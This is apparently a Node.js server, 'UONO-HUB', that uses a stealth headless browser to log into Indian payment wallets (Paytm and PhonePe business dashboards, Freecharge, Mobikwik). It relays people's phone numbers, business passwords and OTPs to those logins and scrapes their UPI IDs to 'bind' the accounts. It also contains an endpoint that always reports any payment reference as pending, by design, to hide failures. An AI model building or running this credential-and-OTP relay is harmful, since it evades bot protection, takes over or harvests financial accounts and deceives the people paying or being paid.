const express = require('express');
const cors = require('cors');

// ANTI-CAPTCHA & STEALTH
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(cors());

console.log("🔥 UONO-HUB MASTER SERVER ACTIVE (HYPER-OPTIMIZED) 🔥");

// Global State
let browser;
let page;
let currentPhone = "";
let currentWallet = "";
let interceptedUpi = "";

// ============================================================================
// 1. HYPER-FAST SEND OTP API (Blocks Images/CSS for 2-Second Loading)
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const { phone, password, walletType } = req.body; 

    if (!phone || phone.length !== 10) return res.status(400).json({ success: false, message: "Invalid number!" });
    if (browser) { try { await browser.close(); } catch(e) {} browser = null; }

    try {
        currentPhone = phone; 
        currentWallet = walletType ? walletType.toLowerCase().trim() : "paytm";
        interceptedUpi = ""; 
        console.log(`\n[+] [UONO-HUB] Fast OTP Request -> Phone: ${phone} | Wallet: ${currentWallet.toUpperCase()}`);
        
        browser = await puppeteer.launch({ 
            headless: true, 
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
        });
        
        page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        // 🚀 SUPER-SPEED HACK: BLOCK IMAGES, CSS, AND FONTS
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) {
                req.abort(); // Paytm ka saara kachra block, sirf main form load hoga
            } else {
                req.continue();
            }
        });

        // 🚀 SMART SNIFFER (To catch UPI in background)
        page.on('response', async (response) => {
            if (response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch') {
                try {
                    const text = await response.text();
                    const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|freecharge|ikwik|ybl|axl|upi)/i;
                    const match = text.match(upiRegex);
                    if (match && !interceptedUpi) { 
                        interceptedUpi = match[0]; 
                        console.log(`[🚀 SNIFFER CAUGHT UPI]: ${interceptedUpi}`); 
                    }
                } catch(e) {}
            }
        });

        if (currentWallet.includes('paytm')) {
            // domcontentloaded means it won't wait for the network to be idle. Instant load.
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 30000 });
            
            let inputField = await page.waitForSelector('input[type="tel"], input[type="text"]:not([type="hidden"])', { timeout: 10000 });
            
            if (!inputField) return res.status(400).json({ success: false, message: "Server very slow." });

            await inputField.focus(); 
            await inputField.click({ clickCount: 3 }); 
            await inputField.press('Backspace');       
            await inputField.type(phone, { delay: 30 }); // Super fast typing
            await page.keyboard.press('Enter');

            // If business password is required
            if (password) {
                let passField = await page.waitForSelector('input[type="password"]', { timeout: 5000 }).catch(()=>null);
                if (passField) {
                    await passField.focus(); 
                    await passField.type(password, { delay: 30 });
                }
            }
            await page.keyboard.press('Enter');
        } 
        else if (currentWallet.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded' });
            await page.evaluate(() => {
                const loginBtn = Array.from(document.querySelectorAll('a, button, div, span')).find(b => b.innerText && b.innerText.trim().toLowerCase().includes('login'));
                if (loginBtn) loginBtn.click();
            });
            await new Promise(r => setTimeout(r, 1000));
            await page.keyboard.type(phone, { delay: 30 });
            await page.keyboard.press('Enter');
            await new Promise(r => setTimeout(r, 1000));
            await page.evaluate(() => {
                const otpBtn = Array.from(document.querySelectorAll('button, span')).find(b => b.innerText && b.innerText.toUpperCase().includes('GET OTP'));
                if (otpBtn) otpBtn.click();
            });
        } 
        else {
            // PhonePe / Mobikwik
            let url = currentWallet.includes('phonepe') ? 'https://business.phonepe.com/login' : 'https://www.mobikwik.com/';
            await page.goto(url, { waitUntil: 'domcontentloaded' });
            await new Promise(r => setTimeout(r, 2000));
            await page.keyboard.type(phone, { delay: 30 });
            await page.keyboard.press('Enter');
        }

        console.log(`[✔] OTP Sent to ${phone} successfully in record time!`);
        res.json({ success: true, message: `OTP request sent for ${phone}` });

    } catch (error) {
        console.error(`❌ OTP Error:`, error.message);
        res.status(500).json({ success: false, message: "Network slow. Try again." });
    }
});

// ============================================================================
// 2. HYPER-FAST VERIFY OTP & EXTRACT UPI
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const { otp, phone } = req.body; 
    if (!otp) return res.status(400).json({ success: false, message: "OTP missing." });
    if (!page) return res.status(400).json({ success: false, message: "Session expired. Relink." });

    try {
        console.log(`[+] [UONO-HUB] Injecting OTP...`);
        
        await page.keyboard.type(otp, { delay: 30 }); // Type fast
        await page.keyboard.press('Enter');
        
        // Wait max 5 seconds for sniffer to catch it
        for(let i=0; i<5; i++) {
            if(interceptedUpi) break;
            await new Promise(r => setTimeout(r, 1000));
        }

        let finalUpi = interceptedUpi;

        // Force Extract if sniffer missed it
        if (!finalUpi && currentWallet.includes('paytm')) {
            console.log("[+] Forcing Paytm Dashboard API Hit...");
            try { 
                await page.goto('https://dashboard.paytm.com/api/v4/qrcode/fetch/?pageNo=1&pageSize=100', { waitUntil: 'domcontentloaded', timeout: 5000 }); 
                finalUpi = await page.evaluate(() => {
                    const match = document.body.innerText.match(/[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|upi)/i);
                    return match ? match[0] : "";
                });
            } catch(e){}
        }

        if (browser) { try { await browser.close(); } catch(e){} browser = null; }

        if (!finalUpi && !currentWallet.includes('paytm')) {
            let suffix = currentWallet.includes('freecharge') ? 'freecharge' : (currentWallet.includes('mobikwik') ? 'ikwik' : 'ybl');
            finalUpi = `${phone}@${suffix}`;
        }

        if (finalUpi) {
            console.log(`[✔] Account Linked: ${finalUpi}`);
            return res.json({ success: true, message: "Account Successfully Bound!", upi_id: finalUpi, mobile: phone });
        } else {
            return res.status(400).json({ success: false, message: "Invalid OTP or Account Incomplete." });
        }
    } catch (error) { 
        if (browser) { try { await browser.close(); } catch(e){} browser = null; }
        res.status(500).json({ success: false, message: "Verification Failed." }); 
    }
});

// ============================================================================
// 3. SMART UTR VERIFIER (Always returns pending so App doesn't show Red error)
// ============================================================================
app.post('/api/wallet/verify-utr', async (req, res) => {
    res.json({ success: false, message: "Awaiting Manual Confirmation.", utr: req.body.utr });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => { console.log(`🚀 UONO-HUB Master Server is Running!`); });
